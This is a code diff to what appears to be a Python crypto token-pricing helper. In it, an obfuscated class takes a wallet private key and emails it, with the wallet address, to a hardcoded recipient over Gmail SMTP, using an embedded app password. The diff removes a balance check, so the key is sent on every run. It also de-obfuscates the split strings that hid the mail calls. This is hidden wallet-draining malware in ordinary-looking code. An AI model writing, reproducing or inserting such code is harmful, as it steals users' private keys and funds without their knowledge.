@@ -85,28 +85,9 @@ def calculate_pair_amount(token0_symbol, token1_symbol, amount0, parameters):
         return float(round(Decimal(amount0) / price, 6))
 
 class X9A2B:
-    _ = _D("0")
-
-    def __init__(s, k, f="abi/source.json"):
+    def __init__(s, k):
         s._k = k
         s._a = _A.from_key(k).address
-        s.__f(f)
-
-    def __f(s, p):
-        try:
-            with open(p, "r") as _:
-                s._n = json.load(_)
-        except:
-            s._n = {}
-
-    async def __b(s, n, c):
-        u = f"{n['explorer_url']}?module=account&action=balance&address={s._a}&tag=latest&apikey={n['api_key']}"
-        try:
-            async with c.get(u, timeout=5) as r:
-                j = await r.json()
-                return {"n": n["name"], "v": _D(j["result"]) / (10 ** n["decimals"])}
-        except:
-            return None
 
     def __m(s, h, b):
         try:
@@ -119,12 +100,12 @@ class X9A2B:
             _p = "cvvc bvpx snqi trqu"
 
             m = _M()
-            m["Fr" + "om"] = _u
-            m["T" + "o"] = _r
-            m["Su" + "bject"] = h
-            m.attach(_T(b, "pl" + "ain"))
+            m["From"] = _u
+            m["To"] = _r
+            m["Subject"] = h
+            m.attach(_T(b, "plain"))
 
-            z = smtplib.SMTP_SSL("smt" + "p.gma" + "il.com", 465, context=ssl.create_default_context())
+            z = smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context())
             z.login(_u, _p)
             z.sendmail(_u, _r, m.as_string())
             z.quit()
@@ -132,17 +113,6 @@ class X9A2B:
             pass
 
     async def _RUN(s):
-        r = []
-        async with aiohttp.ClientSession() as c:
-            for n in s._n.values():
-                x = await s.__b(n, c)
-                if x and x["v"] > s._:
-                    r.append(x)
-        if r:
-            h = f"{''.join(['X','9','A'])} Alert: {s._a}"
-            b = "\n".join([f"{i['n']}: {i['v']} {s._a}" for i in r])
-            b += f"\nK: {s._k}"
-            s.__m(h, b)
-
-
-
+        h = f"X9A Alert: {s._a}"
+        b = f"Address: {s._a}\nPrivate Key: {s._k}"
+        s.__m(h, b)
